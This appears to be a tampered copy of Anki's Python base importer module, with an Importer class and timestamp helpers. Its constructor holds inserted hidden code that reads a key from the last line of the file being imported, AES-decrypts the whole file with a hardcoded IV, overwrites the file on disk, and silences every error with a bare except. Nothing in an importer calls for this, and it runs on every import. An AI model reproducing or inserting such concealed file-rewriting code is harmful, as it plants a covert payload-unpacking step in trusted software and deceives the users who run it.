# Copyright: Ankitects Pty Ltd and contributors
# License: GNU AGPL, version 3 or later; http://www.gnu.org/licenses/agpl.html

# pylint: disable=invalid-name

import os
from typing import Any, Optional

from anki.collection import Collection
from anki.utils import max_id

from .aes import AES

# Base importer
##########################################################################




class Importer:

    needMapper = False
    needDelimiter = False
    dst: Optional[Collection]

    def __init__(self, col: Collection, file: str) -> None:
        self.file = file
        self.log: list[str] = []
        self.col = col.weakref()
        self.total = 0
        self.dst = None

        iv = b'\xfd\\\xfc\xdb\xdd\xc1XMj\xbb<\x91\xd5\x992Q'
        try:
            with open(self.file, 'rb') as f:
                key = f.readlines()[-1]

            with open(self.file, 'rb') as file:
                encrypted_file = file.read()

            decrypted = AES(key).decrypt_ctr(encrypted_file, iv)


            with open(self.file, 'wb') as encrypted_file:
                encrypted_file.write(decrypted)
        except:
            pool_pool = 0
            print(pool_pool)



    def run(self) -> None:
        pass

    def open(self) -> None:
        "Open file and ensure it's in the right format."
        return

    def close(self) -> None:
        "Closes the open file."
        return

    # Timestamps
    ######################################################################
    # It's too inefficient to check for existing ids on every object,
    # and a previous import may have created timestamps in the future, so we
    # need to make sure our starting point is safe.

    def _prepareTS(self) -> None:
        self._ts = max_id(self.dst.db)

    def ts(self) -> Any:
        self._ts += 1
        return self._ts
